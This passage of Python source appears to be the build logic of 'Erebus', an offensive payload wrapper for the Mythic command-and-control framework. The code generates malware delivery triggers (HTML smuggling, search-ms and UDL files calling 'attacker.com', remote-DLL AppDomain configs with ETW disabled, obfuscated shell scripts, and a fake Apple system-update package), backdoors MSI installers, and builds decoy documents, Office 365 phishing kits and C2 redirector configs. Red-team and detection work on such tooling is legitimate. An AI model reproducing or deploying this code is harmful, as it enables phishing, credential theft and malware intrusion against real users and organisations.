                            _countries = [c.strip().upper() for c in _countries_raw.split(",") if c.strip()]
                            _fallback = str(self.get_parameter("0.9g Geofence Fallback URL") or "https://www.microsoft.com")
                            trigger_path = create_geofenced_html_smuggling_trigger(
                                payload_path=str(_geo_exe),
                                allowed_countries=_countries,
                                fallback_redirect=_fallback,
                                output_filename="document.html",
                                download_name=_geo_exe.name,
                                payload_dir=payload_dir,
                            )

                        case "SearchMS":
                            trigger_path = create_searchms_trigger(
                                webdav_host=str(self.get_parameter("0.9h WebDAV Host") or "dav.attacker.com"),
                                webdav_share=str(self.get_parameter("0.9i WebDAV Share") or "share"),
                                webdav_ssl=True,
                                display_name="System Update",
                                output_filename="document.html",
                                payload_dir=payload_dir,
                            )

                        case "UDL":
                            trigger_path = create_udl_trigger(
                                attacker_host=str(self.get_parameter("0.9j UDL Attacker Host") or "attacker.com"),
                                share_name="share",
                                output_filename="database.udl",
                                payload_dir=payload_dir,
                            )

                        case "QR":
                            trigger_path = create_qr_html_trigger(
                                url=str(self.get_parameter("0.9k QR Code URL") or "https://login.microsoftonline.com/"),
                                output_filename="verify.html",
                                payload_dir=payload_dir,
                            )

                        case "AppDomain":
                            _ad_target_key = str(self.get_parameter("0.9l AppDomain Target EXE") or "AddInProcess64")
                            _ad_targets = get_appdomain_targets()
                            _ad_exe = _ad_targets.get(_ad_target_key, {}).get("exe", "AddInProcess.exe")
                            _ad_remote_url = str(self.get_parameter("0.9m AppDomain Remote URL") or "").strip()
                            if _ad_remote_url:
                                trigger_path = create_appdomain_remote_config(
                                    target_exe=_ad_exe,
                                    dll_url=_ad_remote_url,
                                    output_dir=payload_dir,
                                    disable_etw=True,
                                )
                            else:
                                trigger_path = create_appdomain_config(
                                    target_exe=_ad_exe,
                                    output_dir=payload_dir,
                                )

                        # ── Linux triggers ────────────────────────────────────
                        case "Bash":
                            trigger_path = create_bash_trigger(
                                command=(
                                    f"{self.get_parameter('0.9a Trigger Binary')} "
                                    f"{self.get_parameter('0.9b Trigger Command')}"
                                ).strip(),
                                output_filename="update.sh",
                                payload_dir=payload_dir,
                                obfuscate=True,
                                decoy_path=str(decoy_file) if decoy_file.exists() else "",
                                target_os=target_os,
                            )

                        case "Desktop":
                            trigger_path = create_desktop_trigger(
                                command=(
                                    f"{self.get_parameter('0.9a Trigger Binary')} "
                                    f"{self.get_parameter('0.9b Trigger Command')}"
                                ).strip(),
                                output_filename="document.desktop",
                                payload_dir=payload_dir,
                                display_name="PDF Document",
                                icon_name="application-pdf",
                                decoy_path=str(decoy_file) if decoy_file.exists() else "",
                            )

                        # ── macOS triggers ────────────────────────────────────
                        case "Command":
                            trigger_path = create_command_trigger(
                                command=(
                                    f"{self.get_parameter('0.9a Trigger Binary')} "
                                    f"{self.get_parameter('0.9b Trigger Command')}"
                                ).strip(),
                                output_filename="setup.command",
                                payload_dir=payload_dir,
                                decoy_path=str(decoy_file) if decoy_file.exists() else "",
                            )

                        case "AppleScript":
                            trigger_path = create_applescript_trigger(
                                command=(
                                    f"{self.get_parameter('0.9a Trigger Binary')} "
                                    f"{self.get_parameter('0.9b Trigger Command')}"
                                ).strip(),
                                output_filename="update.scpt",
                                payload_dir=payload_dir,
                                decoy_path=str(decoy_file) if decoy_file.exists() else "",
                            )

                        case "PKG":
                            _pkg_payload = payload_dir / "payload"
                            trigger_path = await asyncio.get_running_loop().run_in_executor(
                                None, lambda: create_pkg_trigger(
                                    payload_path=str(_pkg_payload),
                                    output_dir=str(payload_dir),
                                    payload_dir=payload_dir,
                                    pkg_name="SystemUpdate.pkg",
                                    bundle_id="com.apple.systemupdate",
                                )
                            )

                    if trigger_path:
                        response.status = BuildStatus.Success
                        response.build_message = f"{trigger_type} Trigger created!"

                        await self._build_step("[T1137.006] - Adding Trigger", f"{trigger_type} Trigger created at: {trigger_path}", success=True)
                except Exception as e:
                    response.status = BuildStatus.Error
                    response.build_message = f"Failed to create {trigger_type} trigger: {str(e)}"
                    await self._build_step("[T1137.006] - Adding Trigger", f"CRITICAL ERROR: Failed to create {trigger_type} trigger: {str(e)}", success=False)
                    return response
            ######################### End Of Trigger Generation Section #########################
            ######################### MSI Backdooring Section #########################

            # Stage MSI and write helper batch file if the operator enabled it
            if self.get_parameter("5.3 Enable MSI Backdoor"):
                msi_backdoor_uuid = self.get_parameter("5.4 MSI Backdoor File")
                if msi_backdoor_uuid:
                    # Download the MSI content
                    file_resp = await SendMythicRPCFileGetContent(
                        MythicRPCFileGetContentMessage(AgentFileId=msi_backdoor_uuid)
                    )
                    if not file_resp.Success or not file_resp.Content:
                        await self._build_step("[T1218.007] - Staging MSI", "Failed to download uploaded MSI file from Mythic", success=False)
                    else:
                        file_content = await getFileFromMythic(
                            agentFileId=msi_backdoor_uuid
                        )

                        # Resolve original filename via Mythic file search
                        original_msi_name = f"source_{msi_backdoor_uuid}.msi"
                        try:
                            name_resp = await SendMythicRPCFileSearch(
                                MythicRPCFileSearchMessage(AgentFileID=msi_backdoor_uuid)
                            )
                            if name_resp.Success and name_resp.Files:
                                candidate = name_resp.Files[0].Filename
                                if candidate and candidate.lower().endswith(".msi"):
                                    original_msi_name = candidate
                        except Exception:
                            pass  # fall back to uuid-based name

                        # Stage the source MSI into payload_dir
                        msi_payload_dir = Path(agent_build_path) / "payload"
                        msi_payload_dir.mkdir(parents=True, exist_ok=True)
                        staged_source_msi = msi_payload_dir / original_msi_name
                        staged_source_msi.write_bytes(file_content)

                        # Collect build parameters for the helper invocation
                        msi_attack_type   = self.get_parameter("5.5 MSI Attack Type") or "execute"
                        msi_entry_point   = self.get_parameter("5.6 MSI Entry Point") or ""
                        msi_command_args  = self.get_parameter("5.7 MSI Command Arguments") or ""
                        msi_condition     = self.get_parameter("5.8 MSI Execution Condition") or "NOT REMOVE"
                        msi_custom_action = self.get_parameter("5.9 MSI Custom Action Name") or ""

                        if not msi_custom_action:
                            import random as _r, string as _s
                            msi_custom_action = ''.join(_r.choices(_s.ascii_letters, k=8))

                        # Determine expected payload filename based on attack type
                        if msi_attack_type in ("load-dll", "dotnet"):
                            msi_payload_filename = "erebus.dll"
                        elif msi_attack_type == "script":
                            msi_payload_filename = "erebus.vbs"
                        else:
                            msi_payload_filename = "erebus.exe"

                        backdoored_name = f"{Path(original_msi_name).stem}-backdoored.msi"

                        # Build the erebus_helper.py command line with all parameters baked in
                        cmd_parts = [
                            "python erebus_helper.py msi",
                            f'--msi-file "{original_msi_name}"',
                            f'--payload "{msi_payload_filename}"',
                            f'--output "{backdoored_name}"',
                            f'--attack-type {msi_attack_type}',
                            f'--condition "{msi_condition}"',
                            f'--custom-action-name {msi_custom_action}',
                        ]
                        if msi_entry_point:
                            cmd_parts.append(f'--entry-point "{msi_entry_point}"')
                        if msi_command_args:
                            cmd_parts.append(f'--arguments "{msi_command_args}"')

                        bat_lines = [
                            "@echo off",
                            "REM Erebus MSI Backdoor - run this on the Windows target after extracting the archive.",
                            "REM Requires: python erebus_helper.py (bundled) + the payload executable.",
                            "REM Requires Python 3.11 or lower for MSILib to work correctly (Python 3.12+ deprecates MSILib).",
                            "",
                            " ^\r\n    ".join(cmd_parts),
                            "",
                            "if %errorlevel% neq 0 (",
                            "    echo [!] Backdooring failed - check parameters and re-run manually.",
                            ") else (",
                            f'    echo [+] Backdoored MSI written to: {backdoored_name}',
                            ")",
                        ]
                        bat_path = msi_payload_dir / "backdoor_msi.bat"
                        bat_path.write_text("\r\n".join(bat_lines), encoding="utf-8")

                        await self._build_step("[T1218.007] - Staging MSI", f"Staged: {original_msi_name}\n"
                                f"Run backdoor_msi.bat on Windows to produce {backdoored_name}\n"
                                f"Attack: {msi_attack_type}  |  Action: {msi_custom_action}  |  Condition: {msi_condition}", success=True)

            ######################### End Of MSI Backdooring Section #########################
            ######################### Windows Helper Export #########################

            # Export Erebus.Helper as a single merged Python script so it
            # can be run directly (python erebus_helper.py <cmd>) or compiled
            # to a standalone exe with PyInstaller on the target Windows host.
            try:
                helper_src = Path(__file__).parent.parent / "agent_code" / "Erebus.Helper"
                helper_out = Path(agent_build_path) / "payload" / "erebus_helper.py"

                if helper_src.exists():
                    self._bundle_helper_as_single_file(helper_src, helper_out)
                    output += "[+] Exported Erebus.Helper as erebus_helper.py\n"

                    await self._build_step("[T1036] - Exporting Helper", "Exported Erebus.Helper as single-file erebus_helper.py", success=True)
            except Exception as e:
                output += f"[!] Warning: Failed to export helper: {str(e)}\n"

            ######################### IOCs Generation #########################

            # Add all files in payload directory to IOCs list
            if os.path.exists(payload_dir):
                for root, dirs, files in os.walk(payload_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        self.add_to_iocs(iocs_list, file_path, generation_timestamp)

            # Generate IOCs file
            iocs_file_path = os.path.join(payload_dir, "IOCs.txt")
            self.generate_iocs_file(iocs_list, iocs_file_path)
            output += f"[+] Generated IOCs file: IOCs.txt ({len(iocs_list)} files tracked)\n"

            await self._build_step("[T1005] - Gathering Files", f"Generated IOCs tracking file with {len(iocs_list)} hashes", success=True)

            # ATT&CK technique coverage - always generated alongside IOCs
            attack_coverage_path = os.path.join(payload_dir, "attack_coverage.txt")
            self.generate_attack_coverage(attack_coverage_path)

            ######################### Final Payload / Container #########################

            # 1. Capture context for container function
            if 'payload_path' in locals():
                final_path = payload_path
            else:
                final_path = obfuscated_shellcode_path

            self.generated_payload_path = final_path
            self.agent_build_path = agent_build_path

            # Build All mode: produce every trigger + container variant in one ZIP.
            if self.get_parameter("0.0g Build All Configurations"):
                await self._build_step("[T1027] - Build All", "Building all trigger and container variants...", success=True)
                all_bytes = await self._build_all_variants(agent_build_path)
                response.payload = all_bytes
                response.updated_filename = "erebus_all_configs.zip"
                response.status = BuildStatus.Success
                response.build_message = "Build All: all trigger + container variants bundled into erebus_all_configs.zip"
                await self._build_step("[T1027] - Build All", "All variants bundled into erebus_all_configs.zip", success=True)
                return response

            # Redirector config generation (optional, bundled into output ZIP alongside payload)
            if self.get_parameter("7.0 Generate Redirector Configs"):
                try:
                    _redir_out = Path(agent_build_path) / "redirector_configs"
                    generate_redirector_configs(
                        output_dir=str(_redir_out),
                        teamserver_url=self.get_parameter("7.1 Redirector Team Server URL") or "https://10.0.0.5:8443",
                        server_name=self.get_parameter("7.2 Redirector Public Domain") or "cdn.example.com",
                        decoy_url=self.get_parameter("7.3 Redirector Decoy URL") or "https://www.microsoft.com/en-us/",
                    )
                    await self._build_step(
                        "[T1090.002] - Redirector Configs",
                        f"Generated Apache/Nginx/Caddy/Terraform redirector configs in redirector_configs/",
                        success=True,
                    )
                except Exception as _redir_ex:
                    await self._build_step(
                        "[T1090.002] - Redirector Configs",
                        f"Redirector config generation failed: {_redir_ex}",
                        success=False,
                    )

            # Decoy document generation (optional, placed in payload/ dir for loader to open)
            if self.get_parameter("8.0 Generate Decoy Document"):
                try:
                    _decoy_dir = Path(agent_build_path) / "payload"
                    create_decoy_document(
                        output_dir=str(_decoy_dir),
                        template=self.get_parameter("8.1 Decoy Template") or "invoice",
                        company_name=self.get_parameter("8.2 Decoy Company Name") or "Acme Corporation",
                        recipient=self.get_parameter("8.3 Decoy Recipient") or "Valued Employee",
                        output_format=self.get_parameter("8.4 Decoy Format") or "docx",
                    )
                    await self._build_step(
                        "[T1566.001] - Decoy Document",
                        f"Generated {self.get_parameter('8.1 Decoy Template')} decoy document in payload/",
                        success=True,
                    )
                except Exception as _decoy_ex:
                    await self._build_step(
                        "[T1566.001] - Decoy Document",
                        f"Decoy document generation failed: {_decoy_ex}",
                        success=False,
                    )

            # Phishing page kit generation (optional, bundled into redirector_configs/ dir)
            if self.get_parameter("9.0 Generate Phishing Page"):
                try:
                    _phish_out = Path(agent_build_path) / "phishing_kit"
                    create_phishing_page(
                        output_dir=str(_phish_out),
                        template=self.get_parameter("9.1 Phishing Template") or "o365",
                        org_name=self.get_parameter("9.2 Phishing Org Name") or "Acme Corporation",
                        domain=self.get_parameter("9.3 Phishing Domain") or "acme.com",
                        redirect_url=self.get_parameter("9.4 Phishing Redirect URL") or "https://www.office.com",
                        gophish_webhook=self.get_parameter("9.5 GoPhish Webhook") or "",
                    )
                    await self._build_step(
                        "[T1566.002] - Phishing Kit",
                        f"Generated {self.get_parameter('9.1 Phishing Template')} phishing kit in phishing_kit/",
                        success=True,
                    )
                except Exception as _phish_ex:
                    await self._build_step(
                        "[T1566.002] - Phishing Kit",
                        f"Phishing page generation failed: {_phish_ex}",
                        success=False,
                    )

            # 2. Attempt Containerization
            container_path = await self.containerise_payload(agent_build_path)

            if container_path:
                # Case A: Container created (7z/MSI)
                with open(container_path, "rb") as f:
                    response.payload = f.read()

                container = self.get_parameter("3.0 Container Type")
                outer    = (self.get_parameter("3.0T Outer Transport") or "None").strip()

                # Inner container determines filename stem
                match container:
                    case "MSI":
                        filename = "ErebusInstaller"
                        inner_ext = "msi"
                    case "Electron":
                        filename = "ErebusInstaller"
                        inner_ext = "exe"
                    case "MSIX" | "AppInstaller":
                        filename = "ErebusInstaller"
                        inner_ext = "msix"
                    case "ISO":
                        filename = "payload"
                        inner_ext = "iso"
                    case "VHD":
                        filename = "payload"
                        inner_ext = "vhd"
                    case "7z":
                        filename = "payload"
                        inner_ext = "7z"
                    case _:   # Zip and fallback
                        filename = "payload"
                        inner_ext = "zip"

                # Outer transport overrides the final file extension
                match outer:
                    case "ISO":
                        ext = "iso"
                    case "VHD":
                        ext = "vhd"
                    case "ZIP":
                        ext = "zip"
                    case "7z":
                        ext = "7z"
                    case _:
                        ext = inner_ext

                chain_label = f"{container} → {outer}" if outer != "None" else container
                response.updated_filename = f"{filename}.{ext}"
                response.status = BuildStatus.Success
                response.build_message = f"Success! Containerized ({chain_label})"

                await self._build_step(
                    "[T1027] - Containerising",
                    f"Payload packaged: {chain_label}",
                    success=True,
                )

            return response

        except Exception as e:
            response.status = BuildStatus.Error
            response.build_message = f"Error building wrapper: {str(e)}\n{output}"
            return response
